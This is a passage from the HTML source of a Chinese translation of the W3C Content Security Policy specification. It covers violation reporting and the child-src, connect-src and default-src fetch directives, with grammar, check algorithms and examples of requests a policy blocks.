                                                <dd data-md>
                                                    <p><var>violation</var> 的<a data-link-type="dfn"
                                                            href="#violation-global-object"
                                                            id="ref-for-violation-global-object⑥">全局对象</a>的<a
                                                            data-link-type="dfn"
                                                            href="https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object"
                                                            id="ref-for-relevant-settings-object">相关设置对象</a>的<a
                                                            data-link-type="dfn"
                                                            href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin"
                                                            id="ref-for-concept-settings-object-origin①">源</a></p>
                                                </dd>
                                                <dt data-md><a data-link-type="dfn"
                                                        href="https://fetch.spec.whatwg.org/#concept-request-window"
                                                        id="ref-for-concept-request-window">窗口</a>
                                                </dt>
                                                <dd data-md>
                                                    <p>"<code>no-window</code>"</p>
                                                </dd>
                                                <dt data-md><a data-link-type="dfn"
                                                        href="https://fetch.spec.whatwg.org/#concept-request-client"
                                                        id="ref-for-concept-request-client⑤">客户端</a>
                                                </dt>
                                                <dd data-md>
                                                    <p><var>violation</var> 的<a data-link-type="dfn"
                                                            href="#violation-global-object"
                                                            id="ref-for-violation-global-object⑦">全局对象</a>的<a
                                                            data-link-type="dfn"
                                                            href="https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object"
                                                            id="ref-for-relevant-settings-object①">相关设置对象</a></p>
                                                </dd>
                                                <dt data-md><a data-link-type="dfn"
                                                        href="https://fetch.spec.whatwg.org/#concept-request-destination"
                                                        id="ref-for-concept-request-destination③">目标</a>
                                                </dt>
                                                <dd data-md>
                                                    <p>"<code>report</code>"</p>
                                                </dd>
                                                <dt data-md><a data-link-type="dfn"
                                                        href="https://fetch.spec.whatwg.org/#concept-request-initiator"
                                                        id="ref-for-concept-request-initiator">发起者</a>
                                                </dt>
                                                <dd data-md>
                                                    <p>""</p>
                                                </dd>
                                                <dt data-md><a data-link-type="dfn"
                                                        href="https://fetch.spec.whatwg.org/#concept-request-credentials-mode"
                                                        id="ref-for-concept-request-credentials-mode">凭据模式</a>
                                                </dt>
                                                <dd data-md>
                                                    <p>"<code>same-origin</code>"</p>
                                                </dd>
                                                <dt data-md><a data-link-type="dfn"
                                                        href="https://fetch.spec.whatwg.org/#request-keepalive-flag"
                                                        id="ref-for-request-keepalive-flag">keepalive</a>
                                                </dt>
                                                <dd data-md>
                                                    <p>"<code>true</code>"</p>
                                                </dd>
                                                <dt data-md><a data-link-type="dfn"
                                                        href="https://fetch.spec.whatwg.org/#concept-request-header-list"
                                                        id="ref-for-concept-request-header-list">标头列表</a>
                                                </dt>
                                                <dd data-md>
                                                    <p>包含单个标头的标头列表，其名称为 "<code>Content-Type</code>"，值为
                                                        "<code>application/csp-report</code>"</p>
                                                </dd>
                                                <dt data-md><a data-link-type="dfn"
                                                        href="https://fetch.spec.whatwg.org/#concept-request-body"
                                                        id="ref-for-concept-request-body">主体</a>
                                                </dt>
                                                <dd data-md>
                                                    <p>在 <var>violation</var> 上执行<a
                                                            href="#deprecated-serialize-violation">§ 5.3
                                                            获取违规的已弃用序列化</a>的结果
                                                    </p>
                                                </dd>
                                                <dt data-md><a data-link-type="dfn"
                                                        href="https://fetch.spec.whatwg.org/#concept-request-redirect-mode"
                                                        id="ref-for-concept-request-redirect-mode">重定向模式</a>
                                                </dt>
                                                <dd data-md>
                                                    <p>"<code>error</code>"</p>
                                                </dd>
                                            </dl>
                                            <p class="note" role="note"><span class="marker">注意：</span>
                                                <var>request</var> 的<a data-link-type="dfn"
                                                    href="https://fetch.spec.whatwg.org/#concept-request-mode"
                                                    id="ref-for-concept-request-mode">模式</a>默认为
                                                "<code>no-cors</code>"；响应将被完全忽略。
                                            </p>
                                        </li>
                                        <li data-md>
                                            <p><a data-link-type="dfn"
                                                    href="https://fetch.spec.whatwg.org/#concept-fetch"
                                                    id="ref-for-concept-fetch">获取</a> <var>request</var>。结果将被忽略。</p>
                                        </li>
                                    </ol>
                                </li>
                            </ol>
                            <p class="note" role="note"><span
                                    class="marker">注意：</span>所有这些都应被视为已弃用。它为每个违规发送单个请求，这根本不具有可扩展性。一旦可以从用户代理中删除此行为，就会这样做。
                            </p>
                            <p class="note" role="note"><span class="marker">注意：</span><code>report-uri</code> 仅在
                                <code>report-to</code> 不存在时生效。也就是说，后者会覆盖前者，从而允许向后兼容不支持新机制的浏览器。
                            </p>
                        <li data-md>
                            <p>如果 <var>violation</var> 的<a data-link-type="dfn" href="#violation-policy"
                                    id="ref-for-violation-policy⑧">策略</a>的<a data-link-type="dfn"
                                    href="#policy-directive-set" id="ref-for-policy-directive-set①②">指令集</a>包含一个名为“<a
                                    data-link-type="dfn" href="#report-to"
                                    id="ref-for-report-to②"><code>report-to</code></a>”的<a data-link-type="dfn"
                                    href="#directives" id="ref-for-directives①⑨">指令</a> <var>directive</var>：
                            </p>
                            <ol>
                                <li data-md>
                                    <p>令 <var>body</var> 为一个新的 <code
                                            class="idl"><a data-link-type="idl" href="#cspviolationreportbody" id="ref-for-cspviolationreportbody">CSPViolationReportBody</a></code>，初始化如下：
                                    </p>
                                    <dl>
                                        <dt data-md><code
                                                class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-documenturl" id="ref-for-dom-cspviolationreportbody-documenturl">documentURL</a></code>
                                        <dd data-md>
                                            <p>执行 <a href="#strip-url-for-use-in-reports">§ 5.4 用于报告的 URL 剥离</a>，传入
                                                <var>violation</var> 的 <a data-link-type="dfn" href="#violation-url"
                                                    id="ref-for-violation-url④">URL</a>。
                                            </p>
                                        <dt data-md><code
                                                class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-referrer" id="ref-for-dom-cspviolationreportbody-referrer">referrer</a></code>
                                        <dd data-md>
                                            <p>执行 <a href="#strip-url-for-use-in-reports">§ 5.4 用于报告的 URL 剥离</a>，传入
                                                <var>violation</var> 的 <a data-link-type="dfn"
                                                    href="#violation-referrer" id="ref-for-violation-referrer③">引用者</a>。
                                            </p>
                                        <dt data-md><code
                                                class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-blockedurl" id="ref-for-dom-cspviolationreportbody-blockedurl">blockedURL</a></code>
                                        <dd data-md>
                                            <p>执行 <a href="#obtain-violation-blocked-uri">§ 5.2 获取违规资源的
                                                    blockedURI</a>，传入 <var>violation</var> 的 <a data-link-type="dfn"
                                                    href="#violation-resource" id="ref-for-violation-resource①⑥">资源</a>。
                                            </p>
                                        <dt data-md><code
                                                class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-effectivedirective" id="ref-for-dom-cspviolationreportbody-effectivedirective">effectiveDirective</a></code>
                                        <dd data-md>
                                            <p><var>violation</var> 的 <a data-link-type="dfn"
                                                    href="#violation-effective-directive"
                                                    id="ref-for-violation-effective-directive⑤">有效指令</a>。</p>
                                        <dt data-md><code
                                                class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-originalpolicy" id="ref-for-dom-cspviolationreportbody-originalpolicy">originalPolicy</a></code>
                                        <dd data-md>
                                            <p><var>violation</var> 的 <a data-link-type="dfn" href="#serialized-csp"
                                                    id="ref-for-serialized-csp⑦">CSP 序列化</a>。</p>
                                        <dt data-md><code
                                                class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-sourcefile" id="ref-for-dom-cspviolationreportbody-sourcefile">sourceFile</a></code>
                                        <dd data-md>
                                            <p>执行 <a href="#strip-url-for-use-in-reports">§ 5.4 用于报告的 URL 剥离</a>，传入
                                                <var>violation</var> 的 <a data-link-type="dfn"
                                                    href="#violation-source-file"
                                                    id="ref-for-violation-source-file⑥">源文件</a>，如果 <var>violation</var>
                                                的 <a data-link-type="dfn" href="#violation-source-file"
                                                    id="ref-for-violation-source-file⑦">源文件</a> 不为 null，否则为 null。
                                            </p>
                                        <dt data-md><code
                                                class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-sample" id="ref-for-dom-cspviolationreportbody-sample">sample</a></code>
                                        <dd data-md>
                                            <p><var>violation</var> 的 <a data-link-type="dfn" href="#violation-sample"
                                                    id="ref-for-violation-sample⑥">示例</a>。</p>
                                        <dt data-md><code
                                                class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-disposition" id="ref-for-dom-cspviolationreportbody-disposition">disposition</a></code>
                                        <dd data-md>
                                            <p><var>violation</var> 的 <a data-link-type="dfn"
                                                    href="#violation-disposition"
                                                    id="ref-for-violation-disposition①">处置</a>。</p>
                                        <dt data-md><code
                                                class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-statuscode" id="ref-for-dom-cspviolationreportbody-statuscode">statusCode</a></code>
                                        <dd data-md>
                                            <p><var>violation</var> 的 <a data-link-type="dfn" href="#violation-status"
                                                    id="ref-for-violation-status③">状态码</a>。</p>
                                        <dt data-md><code
                                                class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-linenumber" id="ref-for-dom-cspviolationreportbody-linenumber">lineNumber</a></code>
                                        <dd data-md>
                                            <p><var>violation</var> 的 <a data-link-type="dfn"
                                                    href="#violation-line-number"
                                                    id="ref-for-violation-line-number③">行号</a>，如果 <var>violation</var> 的
                                                <a data-link-type="dfn" href="#violation-source-file"
                                                    id="ref-for-violation-source-file⑧">源文件</a> 不为 null，否则为 null。
                                            </p>
                                        <dt data-md><code
                                                class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-columnnumber" id="ref-for-dom-cspviolationreportbody-columnnumber">columnNumber</a></code>
                                        <dd data-md>
                                            <p><var>violation</var> 的 <a data-link-type="dfn"
                                                    href="#violation-column-number"
                                                    id="ref-for-violation-column-number③">列号</a>，如果 <var>violation</var>
                                                的 <a data-link-type="dfn" href="#violation-source-file"
                                                    id="ref-for-violation-source-file⑨">源文件</a> 不为 null，否则为 null。</p>
                                    </dl>
                                <li data-md>
                                    <p>令 <var>settings object</var> 为 <var>violation</var> 的 <a data-link-type="dfn"
                                            href="#violation-global-object"
                                            id="ref-for-violation-global-object⑧">全局对象</a> 的 <a data-link-type="dfn"
                                            href="https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object"
                                            id="ref-for-relevant-settings-object②">相关设置对象</a>。</p>
                                <li data-md>
                                    <p><a data-link-type="dfn"
                                            href="https://www.w3.org/TR/reporting-1/#generate-and-queue-a-report"
                                            id="ref-for-generate-and-queue-a-report①">生成并排队报告</a>，参数如下：</p>
                                    <dl>
                                        <dt data-md><var>context</var>
                                        </dt>
                                        <dd data-md>
                                            <p><var>settings object</var></p>
                                        </dd>
                                        <dt data-md><var>type</var>
                                        </dt>
                                        <dd data-md>
                                            <p>"csp-violation"</p>
                                        </dd>
                                        <dt data-md><var>destination</var>
                                        </dt>
                                        <dd data-md>
                                            <p><var>directive</var> 的<a data-link-type="dfn" href="#directive-value"
                                                    id="ref-for-directive-value①④">值</a>。</p>
                                        </dd>
                                        <dt data-md><var>data</var>
                                        </dt>
                                        <dd data-md>
                                            <p><var>body</var></p>
                                        </dd>
                                    </dl>
                            </ol>
                    </ol>
            </ol>
        </section>
        <section>
            <h2 class="heading settled" data-level="6" id="csp-directives"><span class="secno">6. </span><span
                    class="content">内容安全策略指令</span><a class="self-link" href="#csp-directives"></a></h2>
            <p>本规范定义了一些类型的 <a data-link-type="dfn" href="#directives"
                    id="ref-for-directives②⓪">指令</a>，这些指令允许开发人员控制其网站行为的某些方面。本文档定义了用于管理资源抓取的指令（在 <a
                    href="#directives-fetch">§ 6.1 抓取指令</a> 中）、用于管理文档状态的指令（在 <a href="#directives-document">§ 6.3
                    文档指令</a> 中）、用于管理导航方面的指令（在 <a href="#directives-navigation">§ 6.4 导航指令</a> 中）以及用于管理报告的指令（在 <a
                    href="#directives-reporting">§ 6.5 报告指令</a> 中）。这些构成了内容安全策略的核心；其他指令以模块化的方式在附属文档中定义（参见 <a
                    href="#directives-elsewhere">§ 6.6 其他文档中定义的指令</a> 的示例）。</p>
            <p>为了降低跨站脚本攻击的风险，Web 开发人员应包含一些规定脚本和插件来源的指令。他们可以通过以下方式实现：</p>
            <ul>
                <li data-md>
                    <p>同时包含 <a data-link-type="dfn" href="#script-src" id="ref-for-script-src">script-src</a> 和 <a
                            data-link-type="dfn" href="#object-src" id="ref-for-object-src">object-src</a> 指令，或者</p>
                <li data-md>
                    <p>包含 <a data-link-type="dfn" href="#default-src" id="ref-for-default-src">default-src</a> 指令</p>
            </ul>
            <p>无论哪种情况，开发人员都不应在其策略中包含 <a data-link-type="grammar" href="#grammardef-unsafe-inline"
                    id="ref-for-grammardef-unsafe-inline"><code>'unsafe-inline'</code></a> 或 <code>data:</code>
                作为有效来源。两者都允许直接在文档中包含代码，从而使 XSS 攻击得以实施，因此应尽量避免完全使用。</p>
            <h3 class="heading settled" data-level="6.1" id="directives-fetch"><span class="secno">6.1. </span><span
                    class="content">抓取指令</span><a class="self-link" href="#directives-fetch"></a></h3>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export
                    id="fetch-directives">抓取指令</dfn>控制某些资源类型可以从何处加载。例如，<a data-link-type="dfn" href="#script-src"
                    id="ref-for-script-src①">script-src</a> 允许开发人员信任的脚本来源在页面上执行，而 <a data-link-type="dfn"
                    href="#font-src" id="ref-for-font-src">font-src</a> 控制网页字体的来源。</p>
            <h4 class="heading settled" data-level="6.1.1" id="directive-child-src"><span class="secno">6.1.1.
                </span><span class="content"><code>child-src</code></span><a class="self-link"
                    href="#directive-child-src"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="child-src"><code>child-src</code></dfn>
                指令用于管理 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable"
                    id="ref-for-child-navigable">子导航</a>（例如
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element" id="ref-for-the-iframe-element">iframe</a></code>
                和
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/obsolete.html#frame" id="ref-for-frame">frame</a></code>
                导航）和 Worker 执行上下文的创建。该指令的名称和值的语法由以下 ABNF 描述：
            </p>
            <pre>directive-name  = "child-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list">serialized-source-list</a>
</pre>
            <p>此指令控制将填充帧或 worker 的 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request①⑦">请求</a>。更正式地说，它适用于以下类别的 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①⑧">请求</a>：</p>
            <ul>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-destination"
                            id="ref-for-concept-request-destination④">目的地</a>为
                        "<code>frame</code>"、"<code>iframe</code>"、"<code>object</code>" 或 "<code>embed</code>"。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-destination"
                            id="ref-for-concept-request-destination⑤">目的地</a>为
                        "<code>serviceworker</code>"、"<code>sharedworker</code>" 或 "<code>worker</code>"（将传递给 <a
                            data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/workers.html#run-a-worker"
                            id="ref-for-run-a-worker①">运行 worker</a> 的算法，分别用于 <code
                            class="idl"><a data-link-type="idl" href="https://www.w3.org/TR/service-workers/#serviceworker" id="ref-for-serviceworker">ServiceWorker</a></code>、<code
                            class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#sharedworker" id="ref-for-sharedworker">SharedWorker</a></code>
                        和 <code
                            class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#worker" id="ref-for-worker①">Worker</a></code>）。
                    </p>
            </ul>
            <div class="example" id="example-55db5b11">
                <a class="self-link" href="#example-55db5b11"></a> 给定包含以下内容安全策略的页面：
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy②">Content-Security-Policy</a>: <a data-link-type="dfn" href="#child-src" id="ref-for-child-src">child-src</a> https://example.com/</pre>
                <p>对于以下代码的抓取请求将全部返回网络错误，因为提供的 URL 与 <code>child-src</code> 的 <a data-link-type="dfn"
                        href="#source-lists" id="ref-for-source-lists">来源列表</a>不匹配：</p>
                <pre class="highlight"><c- p>&lt;</c-><c- f>iframe</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org"</c-><c- p>>&lt;/</c-><c- f>iframe</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-><c- p>></c->
  <c- a>var</c-> blockedWorker <c- o>=</c-> <c- ow>new</c-> Worker<c- p>(</c-><c- u>"data:application/javascript,..."</c-><c- p>);</c->
<c- p>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
            </div>
            <h5 class="heading settled algorithm" data-algorithm="child-src Pre-request check" data-level="6.1.1.1"
                id="child-src-pre-request"><span class="secno">6.1.1.1. </span><span
                    class="content"><code>child-src</code> 预请求检查</span><a class="self-link"
                    href="#child-src-pre-request"></a></h5>
            <p>此指令的 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check①">预请求检查</a>如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request①⑨">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object②⑦">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 并将其结果赋给 <var>name</var>。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 应该执行抓取指令吗</a> 的结果对
                        <var>name</var>、<code>child-src</code> 和 <var>policy</var> 为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>返回对名称为 <var>name</var> 的 <a data-link-type="dfn" href="#directives"
                            id="ref-for-directives②①">指令</a>，使用 <a data-link-type="dfn"
                            href="#directive-pre-request-check" id="ref-for-directive-pre-request-check②">预请求检查</a> 并将
                        <var>policy</var> 和 <var>request</var> 作为参数的执行结果，比较时使用此指令的 <a data-link-type="dfn"
                            href="#directive-value" id="ref-for-directive-value①⑤">值</a>。
                    </p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="child-src Post-request check" data-level="6.1.1.2"
                id="child-src-post-request"><span class="secno">6.1.1.2. </span><span
                    class="content"><code>child-src</code> 后请求检查</span><a class="self-link"
                    href="#child-src-post-request"></a></h5>
            <p>此指令的 <a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check②">后请求检查</a>如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request②⓪">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⓪">响应</a>
                <var>response</var>，和一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object②⑧">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 并将其结果赋给 <var>name</var>。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 应该执行抓取指令吗</a> 的结果对
                        <var>name</var>、<code>child-src</code> 和 <var>policy</var> 为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>返回对名称为 <var>name</var> 的 <a data-link-type="dfn" href="#directives"
                            id="ref-for-directives②②">指令</a>，使用 <a data-link-type="dfn"
                            href="#directive-post-request-check" id="ref-for-directive-post-request-check③">后请求检查</a> 并将
                        <var>policy</var>、<var>request</var> 和 <var>response</var> 作为参数的执行结果，比较时使用此指令的 <a
                            data-link-type="dfn" href="#directive-value" id="ref-for-directive-value①②">值</a>。
                    </p>
            </ol>
            <h4 class="heading settled" data-level="6.1.2" id="directive-connect-src"><span class="secno">6.1.2.
                </span><span class="content"><code>connect-src</code></span><a class="self-link"
                    href="#directive-connect-src"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="connect-src"><code>connect-src</code></dfn>
                指令限制通过脚本接口加载的 URL。该指令的名称和值的语法由以下 ABNF 描述：</p>
            <pre>directive-name  = "connect-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①">serialized-source-list</a>
</pre>
            <p>此指令控制 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request②①">请求</a>，这些请求用于从其他源传输或接收数据。这包括 <code>fetch()</code>、<a
                    data-link-type="biblio" href="#biblio-xhr" title="XMLHttpRequest 标准">[XHR]</a>、<a
                    data-link-type="biblio" href="#biblio-eventsource" title="Server-Sent Events">[EVENTSOURCE]</a>、<a
                    data-link-type="biblio" href="#biblio-beacon" title="Beacon">[BEACON]</a> 以及
                <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/text-level-semantics.html#the-a-element" id="ref-for-the-a-element">a</a></code>
                的
                <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/links.html#ping" id="ref-for-ping">ping</a></code>
                属性。此外，此指令还控制 WebSocket 的 <a data-link-type="biblio" href="#biblio-websockets"
                    title="WebSockets 标准">[WEBSOCKETS]</a> 连接，尽管它们技术上不属于 Fetch。
            </p>

            <div class="example" id="example-03b12b1d">
                <a class="self-link" href="#example-03b12b1d"></a> JavaScript
                提供了几种直接连接到外部服务器以发送或接收信息的机制。<code>EventSource</code> 维持与服务器的开放 HTTP 连接，以接收推送通知，<code>WebSockets</code>
                在浏览器和服务器之间打开双向通信通道，而 <code>XMLHttpRequest</code> 代表用户进行任意的 HTTP 请求。这些都是强大的
                API，能够提供有用的功能，但同时也可能成为数据泄露的诱人途径。
                <p><code>connect-src</code> 指令允许您确保这些和类似类型的连接仅能打开到您信任的源。发送一个为此指令定义源表达式列表的策略非常简单。例如，若要限制连接仅能到
                    <code>https://example.com</code>，发送以下头部：
                </p>
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy③">Content-Security-Policy</a>: <a data-link-type="dfn" href="#connect-src" id="ref-for-connect-src">connect-src</a> https://example.com/</pre>
                <p>以下代码的抓取请求将全部返回网络错误，因为提供的 URL 与 <code>connect-src</code> 的 <a data-link-type="dfn"
                        href="#source-lists" id="ref-for-source-lists①">来源列表</a>不匹配：</p>
                <pre class="highlight"><c- p>&lt;</c-><c- f>a</c-> <c- e>ping</c-><c- o>=</c-><c- s>"https://example.org"</c-><c- p>></c->...
<c- p>&lt;</c-><c- f>script</c-><c- p>></c->
  <c- a>var</c-> xhr <c- o>=</c-> <c- ow>new</c-> XMLHttpRequest<c- p>();</c->
  xhr<c- p>.</c->open<c- p>(</c-><c- t>'GET'</c-><c- p>,</c-> <c- t>'https://example.org/'</c-><c- p>);</c->
  xhr<c- p>.</c->send<c- p>();</c->

  <c- a>var</c-> ws <c- o>=</c-> <c- ow>new</c-> WebSocket<c- p>(</c-><c- u>"wss://example.org/"</c-><c- p>);</c->

  <c- a>var</c-> es <c- o>=</c-> <c- ow>new</c-> EventSource<c- p>(</c-><c- u>"https://example.org/"</c-><c- p>);</c->

  navigator<c- p>.</c->sendBeacon<c- p>(</c-><c- u>"https://example.org/"</c-><c- p>,</c-> <c- p>{</c-> <c- p>...</c-> <c- p>});</c->
<c- p>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
            </div>
            <h5 class="heading settled algorithm" data-algorithm="connect-src Pre-request check" data-level="6.1.2.1"
                id="connect-src-pre-request"><span class="secno">6.1.2.1. </span><span
                    class="content"><code>connect-src</code> 预请求检查</span><a class="self-link"
                    href="#connect-src-pre-request"></a></h5>
            <p>此指令的 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check③">预请求检查</a>如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request②②">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object③①">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 并将其结果赋给 <var>name</var>。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 应该执行抓取指令吗</a> 的结果对
                        <var>name</var>、<code>connect-src</code> 和 <var>policy</var> 为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-request-to-source-list">§ 6.7.2.5 请求是否匹配来源列表？</a> 的结果对
                        <var>request</var>、此指令的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value①⑦">值</a> 和 <var>policy</var> 为 "<code>Does Not Match</code>"，则返回
                        "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="connect-src Post-request check" data-level="6.1.2.2"
                id="connect-src-post-request"><span class="secno">6.1.2.2. </span><span
                    class="content"><code>connect-src</code> 后请求检查</span><a class="self-link"
                    href="#connect-src-post-request"></a></h5>
            <p>此指令的 <a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check④">后请求检查</a>如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request②③">请求</a> <var>request</var>，一个 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①①">响应</a>
                <var>response</var>，和一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object③②">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a> 并将其结果赋给 <var>name</var>。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 应该执行抓取指令吗</a> 的结果对
                        <var>name</var>、<code>connect-src</code> 和 <var>policy</var> 为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#match-response-to-source-list">§ 6.7.2.6 响应是否匹配来源列表？</a> 的结果对
                        <var>response</var>、<var>request</var>、此指令的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value①⑧">值</a> 和 <var>policy</var> 为 "<code>Does Not Match</code>"，则返回
                        "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>

            <h4 class="heading settled" data-level="6.1.3" id="directive-default-src"><span class="secno">6.1.3.
                </span><span class="content"><code>default-src</code></span><a class="self-link"
                    href="#directive-default-src"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="default-src"><code>default-src</code></dfn>
                指令作为其他 <a data-link-type="dfn" href="#fetch-directives" id="ref-for-fetch-directives">抓取指令</a>
                的回退。该指令的名称和值的语法由以下 ABNF 描述：</p>
            <pre>directive-name  = "default-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list②">serialized-source-list</a>
</pre>
            <p>如果策略中存在一个 <a data-link-type="dfn" href="#default-src" id="ref-for-default-src①">default-src</a>
                指令，则其值将用作策略的默认来源列表。即，给定 <code>default-src 'none'; script-src 'self'</code>，脚本请求将使用 <code>'self'</code>
                作为 <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists②">来源列表</a> 来进行匹配。其他请求将使用
                <code>'none'</code>。在 <a href="#should-block-request" id="ref-for-should-block-request③">§ 4.1.2 Content
                    Security Policy 是否应阻止请求？</a> 和 <a href="#should-block-response"
                    id="ref-for-should-block-response③">§ 4.1.3 Content Security Policy 是否应阻止响应？</a> 算法中对此进行了更详细的说明。
            </p>

            <div class="note" role="note"> 资源提示如
                <code><a data-link-type="attr-value" href="https://html.spec.whatwg.org/#link-type-prefetch" id="ref-for-link-type-prefetch">prefetch</a></code>
                和
                <code><a data-link-type="attr-value" href="https://html.spec.whatwg.org/#link-type-preconnect" id="ref-for-link-type-preconnect">preconnect</a></code>
                生成的请求不与任何特定的 <a data-link-type="dfn" href="#fetch-directives" id="ref-for-fetch-directives①">抓取指令</a>
                绑定，而是由策略中所有指令的 <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists③">来源列表</a>
                的并集管理。如果未指定 <a data-link-type="dfn" href="#default-src"
                    id="ref-for-default-src②">default-src</a>，这些请求将始终被允许。更多信息请参阅 <a href="#exfiltration">§ 8.6
                    数据外泄</a>。<a data-link-type="biblio" href="#biblio-html" title="HTML 标准">[HTML]</a>
            </div>

            <div class="example" id="example-efa36e1b">
                <a class="self-link" href="#example-efa36e1b"></a> 以下头部：
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy④">Content-Security-Policy</a>: <a data-link-type="dfn" href="#default-src" id="ref-for-default-src③">default-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self③">'self'</a>
</pre>
                <p>与以下头部具有相同的行为：</p>
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy⑤">Content-Security-Policy</a>: <a data-link-type="dfn" href="#connect-src" id="ref-for-connect-src①">connect-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self④">'self'</a>;
